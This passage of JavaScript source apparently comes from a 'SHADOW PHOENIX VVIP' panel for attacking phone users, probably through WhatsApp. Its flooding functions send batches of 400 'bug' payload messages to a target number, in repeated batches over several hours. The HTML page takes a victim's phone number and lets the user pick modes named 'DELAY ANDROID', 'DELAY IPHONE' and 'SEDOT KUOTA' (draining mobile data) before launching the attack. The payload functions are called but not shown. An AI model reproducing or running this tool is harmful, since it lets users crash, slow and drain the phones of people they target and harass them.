        console.log(chalk.green(`Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          iosinVisFC(X),
          NewProtocolbug6(X),
          VtxForceDelMsg2(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-ATHENA 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SHADOW PHOENIX VVIP</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid #8A0303;
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 20px rgba(138, 3, 3, 0.7);
      backdrop-filter: blur(10px);
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 20px rgba(138, 3, 3, 0.9);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
      color: #fff;
    }
    .connected {
      font-size: 14px;
      color: #B22222;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .video-brand { 
    width: 100%;
    max-width: 420px;
    border-radius: 15px; 
    border: 2px solid var(--glass-border); 
    box-shadow: 0 0 20px rgba(138, 99, 210, 0.3); 
    display: block; 
    margin: 0 auto 16px; 
    height: auto;
    aspect-ratio: 16/9;
    transition: all 0.3s ease;
}
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5e;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #111;
      border: 1px solid #8A0303;
      color: #fff;
      margin-bottom: 16px;
      box-shadow: inset 0 0 8px rgba(138, 3, 3, 0.5);
    }
    /* Dropdown */
    .select-wrapper {
      margin-bottom: 16px;
    }
    select {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #111;
      border: 1px solid #8A0303;
      color: #ff4444;
      font-weight: bold;
      text-shadow: 0 0 6px #8A0303;
      cursor: pointer;
      appearance: none;
      box-shadow: inset 0 0 8px rgba(138, 3, 3, 0.5);
    }
    select:focus {
      outline: none;
      border-color: #ff0000;
      box-shadow: 0 0 12px rgba(255, 0, 0, 0.8);
    }
    .execute-button {
      background: linear-gradient(135deg, #8A0303, #5c0000);
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 12px;
      cursor: pointer;
      transition: 0.3s;
      text-shadow: 0 0 6px #8A0303;
    }
    .execute-button:disabled {
      background: #330000;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .execute-button:hover:not(:disabled) {
      background: #B22222;
      box-shadow: 0 0 12px rgba(178, 34, 34, 0.9);
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(138, 3, 3, 0.15);
      border: 1px solid #8A0303;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease, box-shadow 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(138, 3, 3, 0.3);
      box-shadow: 0 0 8px rgba(138, 3, 3, 0.7);
    }
    .footer-button a {
      text-decoration: none;
      color: #ff4444;
      display: flex;
      align-items: center;
      gap: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <video autoplay muted loop class="video-brand">
          <source src="https://files.catbox.moe/sxmhgw.mp4" type="video/mp4">
        </video>
    <div class="username">Olá, ${username || 'Anônimo'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" id="numberInput" placeholder="Please input target number. example : +628xxxxxxx or 628xxxxxxx or +1202xxxxxxx" />

    <div class="select-wrapper">
      <select id="modeSelect">
        <option value="" disabled selected>      Select Bugs</option>
        <option value="anrooodelayy">S-P DELAY ANDROID</option>
        <option value="delayyiosss">S-P DELAY IPHONE</option>
        <option value="delayyiosss">S-P DELAY HARD</option>
        <option value="sedotkuotaa">S-P SEDOT KUOTA</option>
      </select>
    </div>

    <button class="execute-button" id="executeBtn" disabled>
      <i class="fas fa-moon"></i> EXECUTE
    </button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/shadowapknew" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Desconhecido'}
        <span style="color:#ff4444; font-weight:bold;">&nbsp;•&nbsp;</span>
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <script>
  const inputField = document.getElementById('numberInput');
  const modeSelect = document.getElementById('modeSelect');
  const executeBtn = document.getElementById('executeBtn');

  function isValidNumber(number) {
    const pattern = /^\\+?\\d{7,20}$/;
    return pattern.test(number);
  }

  function toggleButton() {
    const number = inputField.value.trim().replace(/\\s+/g, '');
    const selectedMode = modeSelect.value;
    executeBtn.disabled = !(isValidNumber(number) && selectedMode);
  }

  inputField.addEventListener('input', toggleButton);
  modeSelect.addEventListener('change', toggleButton);

  executeBtn.addEventListener('click', () => {
    const number = inputField.value.trim().replace(/\\s+/g, '');
    const selectedMode = modeSelect.value;
    window.location.href = '/execution?mode=' + selectedMode + '&target=' + encodeURIComponent(number);
  });

  toggleButton();
  </script>
</body>
</html>`;
};
